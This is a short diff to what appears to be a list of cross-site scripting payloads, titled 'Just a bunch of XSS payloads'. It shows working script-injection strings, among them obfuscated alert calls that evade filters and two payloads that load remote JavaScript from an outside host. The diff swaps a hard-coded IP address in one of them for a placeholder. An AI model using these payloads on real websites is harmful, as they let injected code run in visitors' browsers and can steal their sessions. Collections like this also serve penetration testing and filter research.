@@ -13,7 +13,7 @@ Just a bunch of XSS payloads.
 <SCRIPT/a SRC=http://xss.rocks/xss.js></SCRIPT/a>
 <script>(alert)(1)</script>
 <script>[1].find(top[/al/.source+/ert/.source])(1)</script>
-<script>with(document)body.appendChild(createElement('script')).src/**/='http://52.64.216.80/xss.js'</script>
+<script>with(document)body.appendChild(createElement('script')).src/**/='http://IP/xss.js'</script>
 <script>top[8680439..toString(30)](1)</script>
 ```
 
